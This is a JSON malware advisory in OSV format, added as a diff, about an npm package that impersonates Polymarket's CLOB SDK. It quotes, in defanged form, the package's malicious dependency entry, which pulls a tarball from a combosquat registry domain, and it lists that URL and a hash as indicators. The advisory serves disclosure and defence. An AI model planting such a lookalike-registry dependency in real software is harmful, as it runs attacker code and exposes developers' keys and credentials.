@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12670",
+  "modified": "2026-10-08T12:02:33Z",
+  "published": "2026-10-08T00:31:30Z",
+  "summary": "Malicious code in @polymarkets/clob-client-v2 (npm)",
+  "details": "@polymarkets/clob-client-v2 impersonates Polymarket's official CLOB TypeScript SDK (description \"TypeScript client for Polymarket's CLOB\", repository github[.]com/dev-polymarket/clob-client-v2) but its package.json declares a runtime dependency resolved from a lookalike registry domain instead of the npm registry: \"dependencies\": { \"typescript-eslint\": \"hxxps://registrynpmjs[.]to/typescript-eslint-8[.]58[.]2[.]tgz\",... } registrynpmjs.to is a combosquat of registry[.]npmjs[.]org. Because the entry sits in the runtime \"dependencies\" block, every `npm install` of this package fetches and executes an attacker-controlled tarball from that host, giving the operator arbitrary code execution in the installer's environment. The package is aimed at developers handling Polymarket wallet private keys and CLOB API credentials (CLOB_API_KEY, CLOB_SECRET, CLOB_PASS_PHRASE), which the dependency's install-time code can reach. The shipped dist/ bundles contain no lifecycle hooks or obfuscation of their own — the payload is the dependency spec itself. IOC: hxxps://registrynpmjs[.]to/typescript-eslint-8[.]58[.]2[.]tgz (host registrynpmjs.to)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@polymarkets/clob-client-v2",
+        "purl": "pkg:npm/%40polymarkets/clob-client-v2"
+      },
+      "versions": [
+        "1.0.5"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@polymarkets/clob-client-v2/v/1.0.5"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12670"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-08T00:31:30Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "registrynpmjs[.]to"
+        ],
+        "sha256": [
+          "35ded97619d30fe33acbf6c3cd8fdb2967695185465b55ae6532cbf3023a224a"
+        ],
+        "url_observed": [
+          "hxxps://registrynpmjs[.]to/typescript-eslint-8[.]58[.]2[.]tgz"
+        ]
+      }
+    }
+  }
+}
